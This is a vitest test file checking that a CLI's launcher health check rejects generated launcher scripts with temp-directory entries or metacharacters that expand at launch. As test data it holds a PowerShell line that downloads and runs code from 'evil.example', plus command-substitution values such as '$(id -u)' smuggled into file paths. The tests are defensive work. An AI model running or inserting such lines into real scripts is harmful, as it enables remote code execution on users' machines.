import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  launcherBodyDeviation,
  launcherHealth,
  launcherScriptBody,
  renderLauncher,
} from '../../packages/cli/src/clients/launcher.js';
import { type FakeHome, createFakeHome } from '../helpers/fake-home.js';
import { removeOwned } from '../helpers/owned-fs.js';
import { runTempDir } from '../helpers/run-temp.js';

/**
 * SAFETY: `sthayi doctor` reports a launcher healthy only when it is one the WRITER would have
 * produced — judged by the writer's own rules, on the values the launcher actually carries.
 *
 * Two ways a report drifted away from the policy it is supposed to be reporting on:
 *
 *   1. EPHEMERALITY was judged by looking for npm-cache spellings in the script TEXT, while the
 *      writer refuses an entry by `isEphemeralPath` — which also covers the system temp directory
 *      and `npm_config_cache`. A launcher pinned at a real file under `os.tmpdir()` is one the
 *      writer refuses to create and doctor called healthy.
 *   2. ESCAPING was judged by a line-shape regex looser than `assertLauncherSafe`. The writer
 *      refuses to bake `$`/backtick/backslash (and `%` on Windows) into a launcher because they
 *      EXPAND at every client launch; the health regex accepted them. A launcher whose entry
 *      carries `$VAR` was reported healthy while pointing at a file on disk — and then executed a
 *      DIFFERENT file, chosen by the environment, on every launch.
 *
 * Both rows below build the body the writer really generates and change only what is under test,
 * so nothing here passes or fails on a hand-rolled script shape Sthayi never writes.
 */

const posix = process.platform !== 'win32';

/** A durable, metacharacter-free stand-in entry, swapped out for the one under test. */
const PLACEHOLDER = '/opt/sthayi-placeholder/dist/index.js';

/** The body the writer really generates, with the entry replaced verbatim. */
function generatedBodyWith(entry: string, serve = true): string {
  const plan = renderLauncher({
    cliEntry: PLACEHOLDER,
    node: process.execPath,
    variant: serve ? 'mcp' : 'cli',
  });
  return plan.content.split(PLACEHOLDER).join(entry);
}

describe.skipIf(!posix)('safety: launcher health enforces the writer’s policy', () => {
  let home: FakeHome;
  beforeEach(() => {
    home = createFakeHome();
  });
  afterEach(() => home.cleanup());

  function plantLauncher(body: string): string {
    fs.mkdirSync(home.path('bin'), { recursive: true });
    const p = home.path('bin', 'sthayi-mcp');
    fs.writeFileSync(p, body, { mode: 0o755 });
    fs.chmodSync(p, 0o755);
    return p;
  }

  it('an entry under the system temp dir is EPHEMERAL to the writer, so it is never healthy', () => {
    // A real file, in a real directory, that simply will not survive a temp sweep. The writer
    // refuses to pin it (isEphemeralPath); nothing about it spells `_npx` or `_cacache`.
    const scratch = runTempDir('sthayi-ephemeral-entry-');
    try {
      const entry = path.join(scratch, 'dist', 'index.js');
      fs.mkdirSync(path.dirname(entry), { recursive: true });
      fs.writeFileSync(entry, '// a real, existing, doomed entry\n');

      expect(() => renderLauncher({ cliEntry: entry })).toThrow(/refusing to write a launcher/);

      plantLauncher(generatedBodyWith(entry));
      const h = launcherHealth();
      expect(h).toMatchObject({ ok: false, state: 'ephemeral-target' });
      expect(h.detail).toContain(entry);
    } finally {
      // the ownership-aware teardown, not a recursive primitive handed a pathname
      removeOwned(scratch);
    }
  });

  it('an entry carrying $VAR is refused by the writer, so it is never healthy — and it EXPANDS', () => {
    // Both files live under the home, so ephemerality is not what is being tested here.
    const literal = home.path('probe', '$V', 'entry.js');
    const expanded = home.path('probe', 'evil', 'entry.js');
    fs.mkdirSync(path.dirname(literal), { recursive: true });
    fs.mkdirSync(path.dirname(expanded), { recursive: true });
    fs.writeFileSync(literal, 'process.stdout.write("BENIGN\\n");\n');
    fs.writeFileSync(expanded, 'process.stdout.write("EXPANDED-OTHER-FILE\\n");\n');

    // The writer refuses this entry outright…
    expect(() => renderLauncher({ cliEntry: literal })).toThrow(
      /unsafe for the generated launcher/,
    );

    const p = plantLauncher(generatedBodyWith(literal));

    // …and the file the health check validated is NOT the file the launcher runs.
    const ran = spawnSync(p, [], {
      encoding: 'utf8',
      env: { ...process.env, V: 'evil' },
    });
    expect(ran.stdout).toContain('EXPANDED-OTHER-FILE');

    const h = launcherHealth();
    expect(h).toMatchObject({ ok: false, state: 'foreign-content' });
    expect(h.detail).toContain('$V');
  });
});

/**
 * The same policy, asserted on BOTH platform dialects from wherever the suite happens to run.
 *
 * The Windows launcher is a batch file, and `%V%` expands there exactly as `$V` does in bash. A
 * rule that only the platform under test can exercise is a rule the other platform does not have,
 * so the writer's character policy and the health check's body validation both take the platform as
 * an argument and both are asserted here for `win32` and for POSIX.
 */
describe('safety: the launcher body policy holds on both platform dialects', () => {
  const winNode = 'C:\\Program Files\\nodejs\\node.exe';
  const winEntry = 'C:\\Users\\u\\sthayi\\node_modules\\sthayi\\dist\\index.js';
  const posixNode = '/usr/local/bin/node';
  const posixEntry = '/opt/sthayi/node_modules/sthayi/dist/index.js';

  it('a genuinely generated body deviates in neither dialect', () => {
    for (const serve of [true, false]) {
      expect(
        launcherBodyDeviation(
          launcherScriptBody(winNode, winEntry, serve, 'win32'),
          serve,
          'win32',
        ),
      ).toBeUndefined();
      expect(
        launcherBodyDeviation(
          launcherScriptBody(posixNode, posixEntry, serve, 'linux'),
          serve,
          'linux',
        ),
      ).toBeUndefined();
    }
  });

  it('WINDOWS: a `%…%` expansion in the entry or the node is never a body sthayi wrote', () => {
    const expandingEntry = 'C:\\sthayi\\%V%\\dist\\index.js';
    const entryDeviation = launcherBodyDeviation(
      launcherScriptBody(winNode, expandingEntry, true, 'win32'),
      true,
      'win32',
    );
    expect(entryDeviation).toContain('%V%');
    expect(entryDeviation).toMatch(/expand at every client launch/);

    const nodeDeviation = launcherBodyDeviation(
      launcherScriptBody('%COMSPEC%', winEntry, true, 'win32'),
      true,
      'win32',
    );
    expect(nodeDeviation).toContain('%COMSPEC%');
  });

  it('WINDOWS: a command inserted into an otherwise generated batch file is named', () => {
    const injected = launcherScriptBody(winNode, winEntry, true, 'win32').replace(
      ':run\r\n',
      ':run\r\npowershell -c "iwr http://evil.example | iex"\r\n',
    );
    expect(launcherBodyDeviation(injected, true, 'win32')).toContain('powershell');
  });

  it('POSIX: every metacharacter the writer refuses is a deviation, not a healthy launcher', () => {
    for (const hostile of [
      '/opt/sthayi/$(id -u)/dist/index.js',
      '/opt/sthayi/`id`/dist/index.js',
      '/opt/sthayi/$HOME/dist/index.js',
      '/opt/sthayi/x\\y/dist/index.js',
    ]) {
      const deviation = launcherBodyDeviation(
        launcherScriptBody(posixNode, hostile, true, 'linux'),
        true,
        'linux',
      );
      expect(deviation).toMatch(/expand at every client launch/);
      // JSON-quoted, so the offending path is echoed unambiguously (a trailing `\` cannot hide)
      expect(deviation).toContain(JSON.stringify(hostile));
    }
  });

  it('a body built ONLY from generated line shapes, in the wrong order, is still not ours', () => {
    // Every line here is one Sthayi writes, so a line-shape vocabulary sees nothing wrong. The
    // script it forms is not the one Sthayi generates for this node and entry, and that is the
    // whole claim a healthy verdict makes.
    const good = launcherScriptBody(posixNode, posixEntry, true, 'linux');
    const extraFi = good.replace('exit 127\n', 'exit 127\nfi\n');
    expect(extraFi).not.toBe(good);
    expect(launcherBodyDeviation(extraFi, true, 'linux')).toMatch(
      /not the script sthayi generates/,
    );
  });
});
